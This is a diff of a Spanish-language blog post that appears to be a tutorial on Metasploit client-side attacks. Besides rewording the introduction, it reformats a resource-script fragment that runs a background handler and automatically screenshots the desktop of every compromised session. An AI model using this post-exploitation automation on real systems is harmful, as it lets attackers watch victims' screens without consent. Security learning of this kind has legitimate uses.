@@ -11,7 +11,7 @@ title: "metasploit - client side attack"
 
 <h4>Introducción</h4>
 
-<div class="p">Entonces, estaba el otro día en la universidad con unos amigos comentando temas de seguridad y salío el tema de metasploit y set, dos herramientas que facilitan el trabajo en el area, no conozco a persona interesada por el tema que no lo conozca. Hace algunos años habia estado interesado en mfs, así que pude notar la gran mejoria respecto a aquellos tiempos. Es increible, me siento como un chico de pelicula de policias cuando lo ejecuto.
+<div class="p">Entonces, estaba el otro día hablando sobre temas de seguridad y salíeron a mención metasploit y set, dos herramientas que facilitan el trabajo en el area, no conozco a persona interesada por el tema que no lo conozca. Hace algunos años habia estado interesado en mfs, así que pude notar la gran mejoria respecto a aquellos tiempos. Es increible, me siento como un chico de pelicula de policias cuando lo ejecuto.
 </div>
 
 <div class="p">Después de la charla, me quede con la espinita de que tan fácil sería montar algo usable por un total noob en el tema (me), y nada, al parecer hemos llegado a un punto donde cualquier persona puede montar una plataforma relativamente robusta para lanzar ataques. MMM, bueno, eso es desde hace tiempo, pero ahora, junto ahora (y justo como lo he experimentado) es muy fácil y no se requieren de mucha preparación. Tenemos servicios, como AWS, Linode que también ayudan a superar las limitaciones de las configuraciones NAT y el uptime. En mi opinión es una de las mejoras epocas para involucrarse en la seguridad informática.
@@ -115,19 +115,19 @@ set ExitOnSession false
 exploit -j
 
 -ruby-
-        sleep(1)
-        print_status("waiting on an incoming session...")
-        while (true)
-                framework.sessions.each_pair do |sid,s|
-                thost = s.session_host
+  sleep(1)
+  print_status("waiting on an incoming session...")
+  while (true)
+    framework.sessions.each_pair do |sid,s|
+    thost = s.session_host
 
-                if s.ext.aliases['stdapi']
-                        print_status("Screenshotting session #{sid} #{thost}...")
-                        s.console.run_single("screenshot -p #{thost}_#{sid}.jpg -v false -q 85")
-                else
-                        print_status("session #{sid} #{thost} active, but not yet configurated")
-                end
-        end
+    if s.ext.aliases['stdapi']
+      print_status("Screenshotting session #{sid} #{thost}...")
+      s.console.run_single("screenshot -p #{thost}_#{sid}.jpg -v false -q 85")
+    else
+      print_status("session #{sid} #{thost} active, but not yet configurated")
+    end
+  end
 end
 -/ruby-
 </pre>
